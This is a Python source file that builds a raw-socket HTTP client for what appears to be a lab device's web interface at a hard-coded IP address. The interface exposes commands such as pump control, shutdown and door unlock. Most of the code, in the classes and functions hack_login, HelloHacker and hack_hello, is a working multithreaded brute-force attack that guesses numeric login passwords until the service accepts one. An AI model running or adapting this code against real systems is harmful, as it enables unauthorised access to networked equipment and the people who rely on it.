"""

Created by: Nathan Starkweather
Created on: 05/19/2014
Created in: PyCharm Community Edition


"""

from socket import socket, timeout
from time import time

__author__ = 'Nathan Starkweather'


DEBUG = print


def reloadhello():
    import sys
    g = sys.modules['__main__'].__dict__
    for mod in ('hello', 'hello.hello'):
        try:
            del sys.modules[mod]
        except KeyError:
            pass
    exec("from hello.hello import *", g, g)


class HelloApp():

    """
    Hello Application
    @type sock: socket
    """

    timeout = 3  # seconds to time out socket connection

    def __init__(self, host='71.189.82.196', port=83, proto='HTTP/1.1', svcpth='webservice/interface',
                 headers=None):
        self.host = host
        self.port = port
        self.proto = proto
        svcpth = svcpth.strip('/')
        self.call_url = svcpth.join(('/', '/?&'))

        default_headers = {
                'Connection': 'keep-alive',
                'Accept': 'application/json',
                'User-Agent': 'Chrome/35.0.1916.114',
                'Accept-Encoding': 'text/plain',
                'Accept-Language': 'en-US',
                'Host': ':'.join((host, str(port))),
                'Referer': 'http://71.189.82.196:83/hello.html',
                # 'Cookie': '_appwebSessionId_=7b902c7b71310b605a25a5c33ddc9d7d'
        }

        try:
            default_headers.update(headers)
        except TypeError:
            pass

        self.headers = default_headers

        self.sock = self.connect(host, port)
        self.fp = self.sock.makefile('brw', buffering=0, newline=b'\r\n')

    def connect(self, host, port):

        attempts = 1

        while True:
            sock = socket()
            sock.settimeout(self.timeout)
            try:
                sock.connect((host, port))
                return sock
            except timeout as e:
                DEBUG("Connection failure: %d attempts." % attempts, e)
                attempts += 1

    def login(self, user='user1', pwd='12345'):

        method = 'GET'
        call = 'login'

        args = (
            ('call', call),
            ('skipValidate', 'true'),
            ('loader', 'Authenticating...'),
            ('val1', user),
            ('val2', pwd),
            ('_', self.gettime())
        )

        msg = self.build_call(method, args, self.headers)
        req, headers, body = self.communicate(msg)
        return body

    def communicate(self, msg):

        fp = self.fp
        fp.write(msg)
        fp.flush()

        readline = fp.readline

        # Get request response (first line terminated by \r\n)
        req = readline()
        reqstr = req.decode().rstrip('\n')

        # Headers are a series of lines terminated by '\r\n', followed by an empty line.
        line_buf = []
        add = line_buf.append
        while True:
            line = readline()
            if not line.strip():
                break
            add(line)

        headers = {}
        for line in line_buf:
            k, v = line.split(None, 1)
            headers[k] = v

        # empty line read by prev loop
        # This should be the chunked size of the message body
        line_buf.clear()
        while True:
            line = readline().rstrip()

            # If the line is empty, we're not necessarily at end of message
            if not line:
                break

            nbytes = int(line, 16)
            if nbytes == 0:
                readline()
                break

            # DEBUG("READING BODY:", nbytes, "BYTES")

            chunk = fp.read(nbytes)

            # DEBUG("GOT CHUNK:", chunk, "EXPECTED %d GOT %d" % (nbytes, len(chunk)))

            add(chunk)

            # chunks are terminated by \r\n, so discard that.
            fp.readline()

        body = ''.join(line.decode() for line in line_buf)

        # DEBUG("BODY:", body)

        return reqstr, headers, body

    def build_call(self, method, args, headers):

        tmplt = "{method} {call_url} {proto}\r\n{headers}\r\n\r\n"
        call_url = self.call_url + '&'.join("%s=%s" % arg for arg in args)
        headers = '\r\n'.join("%s: %s" % item for item in headers.items())

        msg = tmplt.format(method=method, call_url=call_url, proto=self.proto, headers=headers)

        return msg.encode('ascii')

    def gettime(self):
        return '%.f' % (999 * time())

    def hack_login(self, user='user1'):

        splitptrn = '<><>'

        args = (
            ('call', 'login'),
            ('skipValidate', 'true'),
            ('loader', 'Authenticating...'),
            ('val1', user),
            ('val2', splitptrn),
            ('_', self.gettime())
        )

        call = self.build_call('GET', args, self.headers)
        splitcall = call.split(splitptrn.encode('ascii'))

        from xml.etree.ElementTree import parse
        from io import StringIO

        guess = -1
        _str = str

        host, port = self.sock.getpeername()

        class GoTo(Exception):
            pass

        while True:
            try:
                while True:
                    guess += 1
                    callguess = _str(guess).encode('ascii').join(splitcall)
                    req, headers, reply = self.communicate(callguess)

                    xmlsrc = StringIO(reply)

                    root = parse(xmlsrc).getroot()
                    result = root.findtext('Result')

                    # print('\nGUESS RESULT:', root, result, guess)

                    if result == 'True' or guess > 12345:
                        raise GoTo
            except OSError:
                print("Remaking sock, connection aborted")
                self.sock = self.connect(host, port)
                self.fp = self.sock.makefile('rwb')
            except GoTo:
                break

        return guess

    def reopen(self):
        host, port = self.sock.getpeername()
        self.sock = self.connect(host, port)
        self.fp.flush()
        self.fp = self.sock.makefile('rwb')


class ServerCall():
    def __init__(self, method, call, keys, values):
        self.method = method
        self.call = call
        self.keys = keys
        self.values = values

    calls = (
    "clearalarm", "clearalarmsbytype", "clearallalarms",
    "getaction", "getalarmlist", "getalarms", "getconfig",
    "getdatareport", "getdoravalues", "getloginstatus",
    "getmaininfo", "getmainvalues", "getpermissions",
    "getpumps", "getrawvalue", "getrecipeitems",
    "getrecipelist", "getrecipes", "getrecipestep",
    "getsample", "getsamplestate", "getsensorstates",
    "getsteptypes", "getusers", "getversion",
    "loadbag", "login", "logout",
    "recipeskip", "reverttrialcal", "runrecipe",
    "savetrialcal", "shutdown", "set",
    "setbacklight", "setbasepump", "setconfig",
    "setdebug", "setendbatch", "setfactorycal",
    "setpumpa", "setpumpb", "setpumpc",
    "setsensorstate", "setstartbatch", "settoplight",
    "setunlockdoor", "trycal", "unclearalarm",
)


def make_cons(n):
    apps = [HelloApp() for _ in range(n)]
    return apps


class HelloHacker(HelloApp):

    notfound = object()

    def __init__(self, usr, pwlow, pwhigh):
        super().__init__()
        self.usr = usr
        self.pwlow = pwlow
        self.pwhigh = pwhigh
        self.pw = self.pwlow - 1

        splitptrn = '<>'

        args = (
            ('call', 'login'),
            ('skipValidate', 'true'),
            ('loader', 'Authenticating...'),
            ('val1', self.usr),
            ('val2', splitptrn),
            ('_', self.gettime())
        )

        call = self.build_call('GET', args, self.headers)
        self.splitcall = call.split(splitptrn.encode('ascii'))
        self.found_pw = False

    def hack(self):

        from io import StringIO
        from xml.etree.ElementTree import parse
        pwhigh = self.pwhigh

        while True:
            try:
                while self.pw < pwhigh:
                    self.pw += 1
                    callguess = str(self.pw).encode('ascii').join(self.splitcall)
                    req, headers, reply = self.communicate(callguess)

                    xmlsrc = StringIO(reply)

                    root = parse(xmlsrc).getroot()
                    result = root.findtext('Result')

                    print('GUESS RESULT:', result, self.pw)

                    if result == 'True':
                        self.found_pw = True
                        self.complete = True
                        return self.pw

            except OSError:
                self.reopen()
                continue

            self.complete = True
            return self.notfound


__start_time = None
__end_time = None

def hack_hello(usr='user1'):
    minguess = 0
    maxguess = 10 ** 5
    maxthreads = 20

    persocket = 100

    guesses = set()
    add = guesses.add
    for i in range(minguess, maxguess, persocket):
        key = (i, i + persocket)
        add(key)

    from concurrent.futures import ThreadPoolExecutor

    threads = set()
    add_thread = threads.add
    pool = ThreadPoolExecutor(maxthreads)

    done = False

    def done_cb(future):
        nonlocal done
        nonlocal nthreads
        if future.exception() is not None:
            if type(future.exception()) is KeyboardInterrupt:
                done = future.exception()
        elif future.result() is not HelloHacker.notfound:
            done = future.result()

        threads.discard(future)
        nthreads -= 1

    from time import perf_counter, sleep
    global __start_time
    global __end_time

    __start_time = perf_counter()

    nthreads = 0

    while guesses:
        pwlow, pwhigh = guesses.pop()
        try:
            app = HelloHacker(usr, pwlow, pwhigh)
        except OSError:
            guesses.add((pwlow, pwhigh))
            print("ERROR ON:", nthreads)
            continue

        thread = pool.submit(app.hack)
        thread.add_done_callback(done_cb)
        add_thread(thread)
        nthreads += 1
        while len(threads) >= maxthreads:
            sleep(3)
            print(nthreads, len(threads))
        if done:
            break

    pool.shutdown(False)
    print(done)

    __end_time = perf_counter()
    print(__end_time - __start_time)









